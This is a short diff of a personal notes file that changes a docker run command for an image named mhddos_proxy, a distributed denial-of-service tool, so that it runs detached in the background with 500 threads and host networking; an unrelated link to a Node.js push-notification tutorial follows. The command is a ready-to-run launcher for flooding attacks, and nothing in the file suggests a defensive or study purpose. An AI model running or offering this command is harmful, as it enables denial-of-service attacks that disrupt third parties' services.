@@ -1,5 +1,5 @@
 /*****base command in background process***/
-docker run  -it --rm --pull always --net=host ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 500 --lang UA
+docker run  -d -it --rm --pull always --net=host ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 500 --lang UA
 
 https://code-boxx.com/push-notifications-nodejs/
 
